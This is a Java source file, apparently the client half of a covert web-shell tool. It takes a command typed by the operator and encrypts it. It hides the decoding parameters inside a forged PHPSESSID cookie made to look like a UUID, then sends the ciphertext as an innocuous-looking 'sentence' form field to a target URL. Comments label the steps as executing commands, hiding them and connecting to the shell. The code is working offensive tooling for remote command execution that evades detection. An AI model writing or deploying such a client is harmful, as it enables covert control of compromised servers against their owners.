package org.sec.http;

import org.sec.http.CookieStoreParams;
import Util.SplitStr;
import org.apache.commons.lang3.RandomStringUtils;

import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.client.CookieStore;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.utils.URIBuilder;
import org.apache.http.cookie.Cookie;
import org.apache.http.cookie.SetCookie;
import org.apache.http.impl.client.BasicCookieStore;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.impl.cookie.BasicClientCookie;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;


import java.util.*;

public class Connect {
    public static Scanner input = new Scanner(System.in);
    public static CookieStoreParams cookieStoreParams = new CookieStoreParams();

    // 输入命令
    public static String inputCmd() {
        System.out.println("[+] Please input the cmd");
        String cmd;
        while ((cmd = input.nextLine()) == null) {
            System.out.println("[-] Please reInput the cmd");
            input.nextLine();
        }
        return cmd;
    }

    // 控制cookie
    public static String controlCookie(String Base, int cmdLength, String leftKey) {
        UUID uuid4 = UUID.randomUUID();
        String uuid = String.valueOf(uuid4);

        System.out.println("[+] originUuid: " + uuid);
        // uuid 格式： 8-4-4-4-12
        StringBuilder arr2 = new StringBuilder(uuid);
        String foremost;
        // 填入进制
        arr2.replace(7, 8, Base);

        // 填入cmdLength
        String want;
        if (Base == "h") {
            want = Integer.toHexString(cmdLength);
            System.out.println("[+] cmdLengh: " + want);
        } else {
            want = String.valueOf(cmdLength);
        }
        arr2.replace(14, 18, want);
        StringBuilder sb1 = new StringBuilder();
        StringBuilder sb2 = new StringBuilder();

        // 填入leftKey
        if (Base == "h") {
            want = Integer.toHexString(Integer.parseInt(leftKey));
            System.out.println("[+] leftKey become: " + want);
        } else {
            want = leftKey;
        }

        // 填入压缩的cmdLength
        arr2.replace(6, 7, String.valueOf(want.length()));
        System.out.println("[+] zipLength: " + want.length());

        String hexTotal = "", middleHexTotal = "";
        // 填入 specialCharHandle 的各种信息
        foremost = String.format("%02d%02d", Encrypt.specialCharHandle.size, Encrypt.specialCharHandle.recordZero);
        if (Encrypt.specialCharHandle.size != 0) {
            for (int i = 0; i < Encrypt.specialCharHandle.size; i++) {
                sb1.append(Encrypt.specialCharHandle.recordIndex[i]);
                sb2.append(Encrypt.specialCharHandle.intChar[i]);
            }
            System.out.println("sb1: " + sb1 + "\n" + "sb2: " + sb2);
            // 数据需要拆分，太大了 + foremost + sb1.toString() + sb2.toString()
            hexTotal = want;
            hexTotal = hexTotal + Integer.toHexString(Integer.parseInt(foremost));
            System.out.println("[+] foremost:" + foremost);
            hexTotal = hexTotal + Integer.toHexString(Integer.parseInt(sb1.toString()));
            System.out.println("[+] sb1 to hex:" + Integer.toHexString(Integer.parseInt(sb1.toString())));

            hexTotal = hexTotal + Integer.toHexString(Integer.parseInt(sb2.toString()));
            System.out.println("[+] sb2 to hex:" + Integer.toHexString(Integer.parseInt(sb2.toString())));

            // recordLength
            foremost = String.format("%02d", Integer.toHexString(Integer.parseInt(sb1.toString())).length());
            System.out.println("[+] recordLength: "+foremost);
            // 填入特殊字符的长度

            arr2.replace(4, 6, String.valueOf(foremost));
        } else {
            arr2.replace(4, 6, "00");
            hexTotal = want;
        }
        System.out.println("[+] hexTotal: " + hexTotal);

        arr2.delete(24, arr2.length());
        arr2.replace(24, 25, hexTotal); //


        arr2.append(RandomStringUtils.random((int) (Math.random() * (30 - 1) + 1), "abcdefghijklmnopqrstuvwxyz123456789"));
        System.out.println("[+] afterUuid: "+arr2);
        uuid = String.valueOf(arr2);

        return uuid.replace("-", "");
    }

    // 执行cmd语句
    public static CookieStore exec(CookieStore cookieStore, Map<String, String> params1, HttpPost post, String cmd, String key) throws Exception {
        // 输入你想要执行的命令
//         String cmd = inputCmd();

        // 隐匿掉
        StringBuilder encrypText = Encrypt.sendEncrypText(cmd, key);
        System.out.println("[+] 加密文本:\n" + encrypText);
        //Decrypt.decryptMain(SplitStr.splitStr(key), encrypText);

        // 剩下部分
        int[] arr1 = new int[Encrypt.calcChar];
        StringBuilder leftKey = new StringBuilder();
        for (int number = 0; number < Encrypt.calcChar; number++) {
            arr1[number] = (Encrypt.recordStr.g_recordStr[number].word.length() - Encrypt.recordStr.g_recordStr[number].rank);
            leftKey.append(arr1[number]);
        }
        //System.out.println("[+] leftKey:" + leftKey);

        // 控制cookie，将 剩下部分 和 命令长度 传入
        BasicClientCookie cookie = new BasicClientCookie("PHPSESSID", Connect.controlCookie("h", Encrypt.cmdLength, String.valueOf(leftKey)));
        cookie.setPath("/");
        cookie.setDomain("127.0.0.1");
        cookieStore.addCookie(cookie);
        System.out.println(cookie);

        // 密文
        params1.put("sentence", String.valueOf(encrypText));

        //4.添加参数
        List<NameValuePair> parameters = new ArrayList<>();
        for (Map.Entry<String, String> entry : params1.entrySet()) {
            parameters.add(new BasicNameValuePair(entry.getKey(), entry.getValue()));
        }

        UrlEncodedFormEntity formEntity;
        formEntity = new UrlEncodedFormEntity(parameters, "UTF-8");
        post.setEntity(formEntity);

        return cookieStore;
    }

    // 连接Shell ,返回一个 http 对象
    public static void connectShell(String url) throws Exception {
        CookieStore cookieStore = new BasicCookieStore();
        //创建httpClient实例
        CloseableHttpClient httpClient = HttpClients.custom().setDefaultCookieStore(cookieStore).build();
        RequestConfig requestConfig = RequestConfig.custom().setConnectTimeout(4000).setSocketTimeout(8000).build();


        //创建一个uri对象
        URIBuilder uriBuilder = new URIBuilder(url);
        //创建httpPost远程连接实例,这里传入目标的网络地址
        HttpPost post = new HttpPost(uriBuilder.build());
        post.setConfig(requestConfig);

        Map<String, String> params1 = new HashMap<>();

        cookieStoreParams.cookieStore = cookieStore;
        cookieStoreParams.params1 = params1;
        cookieStoreParams.post = post;
        cookieStoreParams.httpClient = httpClient;
    }

}

